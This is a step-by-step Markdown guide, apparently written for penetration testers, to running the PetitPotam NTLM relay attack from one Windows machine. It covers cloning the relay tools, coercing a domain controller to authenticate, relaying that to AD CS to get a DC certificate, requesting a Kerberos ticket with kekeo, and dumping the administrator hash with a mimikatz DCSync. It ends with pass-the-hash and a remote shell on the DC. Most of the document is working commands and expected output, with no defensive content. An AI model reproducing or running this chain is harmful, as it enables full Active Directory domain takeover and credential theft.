## PetitPotam attack beginning to end
### process for penetration testers 
### one windows machine only (No KALI)  

[PetitPotam](https://github.com/topotam/PetitPotam) is an attack by [topotam](https://github.com/topotam) which uses MS-EFSRPC EfsRpcOpenFileRaw to coerce authentication (like auth relay, sort of).  

### Requirements:
- [PetitPotam](https://github.com/topotam/PetitPotam)
- [Impacket fork by ExAndroidDev](https://github.com/ExAndroidDev/impacket)
- [mimikatz by gentilkiwi](https://github.com/gentilkiwi/mimikatz/releases) v2.2.0 20210724 or newer
- [kekeo by gentilkiwi](https://github.com/gentilkiwi/kekeo/releases) - probably v2.20 20210723 or newer, but older not tested - if you do have Kali machine 


### Assumptions:
- You are in control (admin rights) of a windows machine which can reach the DC and CA for the domain you are targetting (Test with CommandoVM, YMMV)
- Python3.9+ is installed
- Impacket is NOT installed
- SMB is running on the windows machine you control (default)
- Domain has CA(s) with web services running
- Domain is using NTLM  

### Setup:
- Remove all previous version of impacket or this won't work
- install pyreadline `python -m pip install pyreadline`
- in a folder of your choice in powershell:
  - `git clone https://github.com/ExAndroidDev/impacket.git`
  - `cd impacket`
  - `git switch ntlmrelayx-adcs-attack`
  - `python .\setup.py install`
  - `cd ..`
  - `git clone https://github.com/topotam/PetitPotam.git`
  - `wget -outfile kekeo.zip https://github.com/gentilkiwi/kekeo/releases/download/2.2.0-20210723/kekeo.zip`
  - `Expand-Archive kekeo.zip`
  - `wget -outfile mimikatz_trunk.zip https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210729/mimikatz_trunk.zip`
  - `Expand-Archive .\mimikatz_trunk.zip`  
 
 ### The action:
 - check the certificate servers available (needs to be done on a domain connected computer):
  - `certutil -config - -ping`  
   ![check CAs](https://github.com/grumpychris/pentest-resources/blob/3f2a4ce8350c1751e8da68192c423c85274b92e8/images/petitpotam/certutil_check_1.jpg)  
  - A window pops up with known CAs. Select one and click OK. You should see 'CertUtil: -ping command completed successfully.'  
   ![Click OK on pop-up](https://github.com/grumpychris/pentest-resources/blob/3f2a4ce8350c1751e8da68192c423c85274b92e8/images/petitpotam/certutil_check_2.jpg)  
   ![All is good](https://github.com/grumpychris/pentest-resources/blob/3f2a4ce8350c1751e8da68192c423c85274b92e8/images/petitpotam/certutil_check_3.jpg)  
 - Turn off port 445 listening. This is a minor pain as port 445 is in use. We need to stop SMB services to be able to listen on Windows:
   - in services right click on the *Workstation* service and click stop  
    ![Right Click and hit stop](https://github.com/grumpychris/pentest-resources/blob/3f2a4ce8350c1751e8da68192c423c85274b92e8/images/petitpotam/services_stop_workstation.jpg)  
   - in services right click on the *Server* service and select properties. In properties change the drop down to Disabled and apply  
   ![Disable Server service](https://github.com/grumpychris/pentest-resources/blob/3f2a4ce8350c1751e8da68192c423c85274b92e8/images/petitpotam/services_starting_stop_server.jpg)
   - in services right click on the *Server* service again and select stop
- In an administrative powershell session (Call this Session 1):
  - `Set-SmbServerConfiguration -EnableSMB1Protocol $false`  
   ![turn off SMB1](https://github.com/grumpychris/pentest-resources/blob/3f2a4ce8350c1751e8da68192c423c85274b92e8/images/petitpotam/services_kill_smb1.jpg)
  - `Set-SmbServerConfiguration -EnableSMB2Protocol $false`  
   ![turn off SMB2/3](https://github.com/grumpychris/pentest-resources/blob/3f2a4ce8350c1751e8da68192c423c85274b92e8/images/petitpotam/services_kill_smb2.jpg)
  - You may need to reboot to make windows let go of port 445 
  - Session 1: cd into the exandroiddev impacket examples folder `cd impacket\examples`
  - Session 1: `python .\ntlmrelayx.py -debug -smb2support --target http://<IP_OF_CA_SERVER>/certsrv/certfnsh.asp --adcs --template DomainController`  
   ![run ntlmrelayx](https://github.com/grumpychris/pentest-resources/blob/3f2a4ce8350c1751e8da68192c423c85274b92e8/images/petitpotam/ntlmrelayx_starting.jpg)
- In a second administrative powershell session (Call this Session 2):
  - Session 2: cd into the petitpotam folder `cd petitpotam`
  - Session 2: `.\Petitpotam.py -d <domain_name e.g. lab.local> -pipe lsarpc <LOCAL_IP e.g. 10.1.1.62> <DC_IP e.g. 10.1.1.1>`  
   ![run Petipotam](https://github.com/grumpychris/pentest-resources/blob/3f2a4ce8350c1751e8da68192c423c85274b92e8/images/petitpotam/starting_petitpotam.jpg)
- Session 1: you should see a stream of text like: 
  - *SMBD-Thread-4: Connection from <DOMAIN_SHORT_NAME>/<DC_MACHINE_NAME>$@<DC_IP> controlled, attacking target http://<IP_OF_CA_SERVER>*
  - *HTTP server returned error code 200, treating as a successful login*
  - *Authenticating against http://<IP_OF_CA_SERVER> as <DOMAIN_SHORT_NAME>/<DC_MACHINE_NAME>$ SUCCEED*
  - *Generating CSR...*
  - *CSR generated!*
  - *Getting certificate...*
  - *GOT CERTIFICATE!*
  - *Base64 certificate of user <DC_MACHINE_NAME>$:*
  - and then a chunk of Base64 (the certificate).  
   ![Output from ntlmrelayx on success](https://github.com/grumpychris/pentest-resources/blob/3f2a4ce8350c1751e8da68192c423c85274b92e8/images/petitpotam/ntlmrelayx_output.jpg)
  - You may see a few of these intermixed as multiple requests are being made from SESSION 2
- Session 1: hit `CTRL-C` to kill the ntlm relay
- Session 2: hit `CTRL-C` to kill the Petitpotam.py
- Session 2:
  - cd into the kekeo folder `cd ..\kekeo\x64\`
  - `.\kekeo.exe`
  - `base64 /input:on`
  - `tgt::ask /user:<DC_MACHINE_NAME>$ /domain:lab.local /ptt /pfx:<Base64_Certificate_Here>`  
   ![using the certificate to get and pass ticket](https://github.com/grumpychris/pentest-resources/blob/3f2a4ce8350c1751e8da68192c423c85274b92e8/images/petitpotam/kekeo_tgt_ask.jpg)
- Re-enable the *Server* and *Workstation* services (make sure you turn Server back to Auto start)
- Session 2:
  - `klist`
  - you should see text including `Cached Tickets: (1)` and `Client: <DC_MACHINE_NAME>$ @ <DOMAIN>`  
   ![happy klist output](https://github.com/grumpychris/pentest-resources/blob/3f2a4ce8350c1751e8da68192c423c85274b92e8/images/petitpotam/klist_out.jpg)
  - `cd ..\..\mimikatz_trunk\x64\ `
  - `.\mimikatz.exe`
  - `lsadump::dcsync /domain:bouldersrest.local /user:administrator`  
   ![get the administrator ntlm hash](https://github.com/grumpychris/pentest-resources/blob/3f2a4ce8350c1751e8da68192c423c85274b92e8/images/petitpotam/mimikatz_lsa_dump.jpg)
  - copy the *Hash NTLM* value to the clipboard (don't save it to disk, risks others accessing it)
  - `privilege::debug`
  - `sekurlsa::pth /user:Administrator /domain:bouldersrest.local /ntlm:<administrator_hash>`  
   ![passing the hash of administrator](https://github.com/grumpychris/pentest-resources/blob/3f2a4ce8350c1751e8da68192c423c85274b92e8/images/petitpotam/mimikatz_pth.jpg)
  - In the new cmd prompt which is created:
    - `powershell.exe`
    - `Enter-PSSession -ComputerName <DC_FQDN>`
    - ### PROFIT  
     ![profit](https://github.com/grumpychris/pentest-resources/blob/3f2a4ce8350c1751e8da68192c423c85274b92e8/images/petitpotam/profit.jpg)
